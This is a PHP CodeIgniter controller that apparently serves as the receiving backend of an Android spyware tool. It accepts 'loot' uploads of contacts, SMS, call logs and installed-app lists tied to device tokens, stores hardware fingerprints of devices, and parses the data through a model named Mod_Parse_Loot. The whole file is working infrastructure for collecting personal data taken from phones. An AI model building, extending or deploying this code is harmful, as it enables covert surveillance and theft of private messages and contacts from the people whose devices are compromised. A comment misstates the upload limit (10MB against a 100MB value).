<?php

namespace App\Controllers\api\v1;

use App\Controllers\BaseController;
use App\Models\Mod_Parse_Loot;
use App\Models\Mod_Receive;
use App\Models\Mod_Android;
use App\Models\Mod_Crypt;
use App\Models\Mod_User;
use CodeIgniter\API\ResponseTrait;


class Receive extends BaseController
{
    use ResponseTrait;

    // Configuration for the file upload logic
    private $uploadConfig = [
        'max_size'      => 104857600, // 10MB
        'allowed_types' => ['txt', 'enc'],
        'upload_path'   => WRITEPATH . 'uploads/text_dump/',
        'encrypt_name'  => true,
    ];

    // Allowed file categories
    private $allowedCategories = ['contacts', 'logs', 'sms', 'apps'];

    public function upload()
    {
        // 1. Validate request method
        if (!$this->request->is('post')) {
            return $this->fail('Method not allowed', 405);
        }

        // 2. Validate token first (security first!)
        $token = $this->request->getPost('token');
        if (!$this->validateToken($token)) {
            return $this->failUnauthorized('Invalid or expired token');
        }

        // 3. Validate required parameters
        $validation = $this->validate([
            'token' => 'required|min_length[10]|max_length[255]',
            'print_id' => 'required|integer',
        ]);

        if (!$validation) {
            return $this->failValidationErrors($this->validator->getErrors());
        }

        // 4. Get and validate file
        $file = $this->request->getFile('lootdata');

        if (!$file || !$file->isValid()) {
            return $this->fail($file ? $file->getErrorString() : 'No file uploaded');
        }

        // 5. Additional file validation
        if (!$this->validateFile($file)) {
            return $this->fail('Invalid file type or size');
        }

        // 6. Move file securely
        $newName = $file->getRandomName();
        if (!$file->hasMoved()) {
            try {
                $file->move($this->uploadConfig['upload_path'], $newName);
            } catch (\Exception $e) {
                log_message('error', 'File move failed: ' . $e->getMessage());
                return $this->fail('Failed to save file');
            }
        }

        // 7. Extract file information
        $fileInfo = $this->extractFileInfo($file, $newName);

        // 8. Log upload
        $this->logUpload($token, $fileInfo);

        // 9. Get token owner
        $owner = $this->getTokenOwner($token);
        if (!$owner) {
            // Clean up orphaned file
            @unlink($this->uploadConfig['upload_path'] . $newName);
            return $this->fail('Invalid token owner');
        }

        // 10. Process file based on category
        $result = $this->processUploadedFile($newName, $owner, $fileInfo['category']);

        if ($result) {
            return $this->respondCreated([
                'status' => 'success',
                'message' => 'File uploaded and processed successfully',
                'file_id' => $newName,
                'category' => $fileInfo['category'],
                'timestamp' => date('Y-m-d H:i:s')
            ]);
        }

        return $this->fail('Failed to process uploaded file');
    }

    public function token_verify()
    {
        // Validate request method
        if (!$this->request->is('post')) {
            return $this->fail('Method not allowed', 405);
        }

        // Validate required parameters
        $validation = $this->validate([
            'token' => 'required|min_length[8]|max_length[255]',
            'time' => 'required|string'
//            'time' => 'required|valid_date'
        ]);

        if (!$validation) {
            return $this->failValidationErrors($this->validator->getErrors());
        }

        $token = $this->request->getPost('token');
        $time = $this->request->getPost('time');
        $ip = $this->request->getIPAddress();

        // Log token verification attempt
        $this->logTokenVerification($token, $time, $ip, 'format_correct');

        // Verify token
        $androidModel = new Mod_Android();
        $tokenData = $androidModel->token_test($token);

        if (!$tokenData) {
            $this->logTokenVerification($token, $time, $ip, 'invalid_token');
            return $this->respond([
                'success' => false,
                'token' => $token,
                'validity' => "False",
                'message' => 'Invalid or expired token',
                'timestamp' => date('Y-m-d H:i:s'),
            ], 401);
        }

        // Get user information
        $userModel = new Mod_User();
        $cryptModel = new Mod_Crypt();

        $userData = $userModel->get_vars($tokenData['Token_Owner']);
        if (!$userData) {
            return $this->fail('User not found');
        }

        // Decrypt user information
        $userName = $this->decryptUserData($cryptModel, $userData['Name'] ?? '');
        $userEmail = $this->decryptUserData($cryptModel, $userData['Email'] ?? '');

        // Mark token as used
        $markResult = $userModel->token_mark(
            $tokenData['Token_Owner'],
            $token,
            $tokenData['Token_ID']
        );

        return $this->respond([
            'success' => true,
            'token' => $token,
            'validity' => true,
            'timestamp' => date('Y-m-d H:i:s'),
            'token_owner' => $tokenData['Token_Owner'],
            'token_expiry' => $tokenData['Token_Expiry'],
            'token_id' => $tokenData['Token_ID'],
            'token_owner_name' => $userName,
            'token_owner_email' => $userEmail
        ]);
    }

    public function device_print()
    {
        if (!$this->request->is('post')) {
            return $this->fail('Method not allowed', 405);
        }

        // Define expected device print fields
        $expectedFields = [
            'p_Board', 'p_Brand', 'p_Device',
            'p_Display', 'p_Hardware', 'p_Manufacturer', 'p_Model'
        ];

        $input = $this->request->getPost();

        // Validate required fields
        foreach ($expectedFields as $field) {
            if (empty($input[$field])) {
                return $this->failValidationError("Missing field: {$field}");
            }
        }

        // Sanitize input
        $sanitizedData = [];
        foreach ($expectedFields as $field) {
            $sanitizedData[$field] = htmlspecialchars($input[$field], ENT_QUOTES, 'UTF-8');
        }
        $sanitizedData['p_Timestamp'] = date('Y-m-d H:i:s');

        try {
            $modelReceive = new Mod_Receive();
            $pdId = $modelReceive->make_device_print($sanitizedData);

            return $this->respond([
                'success' => true,
                'pd_id' => $pdId,
                'message' => 'Device print registered successfully',
                'timestamp' => date('Y-m-d H:i:s')
            ]);

        } catch (\Exception $e) {
            log_message('error', 'Device print failed: ' . $e->getMessage());
            return $this->failServerError('Failed to register device print');
        }
    }

    /**
     * Helper Methods
     */

    private function validateToken($token): bool
    {
        if (empty($token)) {
            return false;
        }

        $androidModel = new Mod_Android();
        $tokenData = $androidModel->token_test($token);

        return $tokenData !== null;
    }

    private function validateFile(File $file): bool
    {
        // Check file size
        if ($file->getSize() > $this->uploadConfig['max_size']) {
            return false;
        }

        // Check file extension
        $extension = $file->getExtension();
        if (!in_array($extension, $this->uploadConfig['allowed_types'])) {
            return false;
        }

        // Check MIME type
        $mimeType = $file->getMimeType();
        $allowedMimes = ['text/plain', 'application/octet-stream'];
        if (!in_array($mimeType, $allowedMimes)) {
            return false;
        }

        // Optional: Add virus scanning here
        // if (!$this->scanForViruses($file->getPathname())) { ... }

        return true;
    }

    private function extractFileInfo(File $file, $newName): array
    {
        $originalName = $file->getClientName();
        $parts = explode('_', $originalName);

        return [
            'original_name' => $originalName,
            'new_name' => $newName,
            'size' => $file->getSize(),
            'extension' => $file->getExtension(),
            'mime_type' => $file->getMimeType(),
            'category' => $parts[0] ?? 'unknown',
            'upload_path' => $this->uploadConfig['upload_path'] . $newName
        ];
    }

    private function logUpload($token, array $fileInfo)
    {
        $modelReceive = new Mod_Receive();

        $logData = [
            'Up_token' => $token,
            'Up_file_realname' => $fileInfo['original_name'],
            'Up_file_name' => $fileInfo['new_name'],
            'Up_file_size' => $modelReceive->get_file_size($fileInfo['size']),
            'Up_file_extension' => $fileInfo['extension'],
            'Up_file_text' => $fileInfo['category'],
            'Up_time' => date('Y-m-d H:i:s')
        ];

        $modelReceive->make_upload(
            $logData['Up_token'],
            $logData['Up_file_realname'],
            $logData['Up_file_name'],
            $logData['Up_file_size'],
            $logData['Up_file_extension'],
            $logData['Up_file_text']
        );
    }

    private function getTokenOwner($token)
    {
        $modelReceive = new Mod_Receive();
        $owner = $modelReceive->get_token_owner($token);

        return $owner && $owner !== '-0-' ? $owner['Token_Owner'] : null;
    }

    private function processUploadedFile($filename, $ownerId, $category)
    {
        if (!in_array($category, $this->allowedCategories)) {
            log_message('warning', "Unknown file category: {$category}");
            return false;
        }

        $modelParse = new Mod_Parse_Loot();
        $printId = $this->request->getPost('print_id');

        $methodMap = [
            'contacts' => 'get_contacts',
            'logs' => 'get_logs',
            'sms' => 'get_sms',
            'apps' => 'get_apps'
        ];

        if (isset($methodMap[$category]) && method_exists($modelParse, $methodMap[$category])) {
            try {
                return $modelParse->{$methodMap[$category]}($filename, $ownerId, $printId);
            } catch (\Exception $e) {
                log_message('error', "Failed to parse {$category}: " . $e->getMessage());
                return false;
            }
        }

        return false;
    }

    private function logTokenVerification($token, $time, $ip, $format)
    {
        $modelReceive = new Mod_Receive();
        $modelReceive->make_test_token($token, $time, $ip, $format);
    }

    private function decryptUserData($cryptModel, $encryptedData)
    {
        if (empty($encryptedData)) {
            return '';
        }

        try {
            $decoded = base64_decode($encryptedData);
            if ($decoded === false) {
                return '';
            }
            return $cryptModel->Dec_String($decoded);
        } catch (\Exception $e) {
            log_message('error', 'Failed to decrypt user data: ' . $e->getMessage());
            return '';
        }
    }

    private function failValidationError($message)
    {
        return $this->respond([
            'success' => false,
            'message' => $message,
            'errors' => [$message]
        ], 422);
    }
}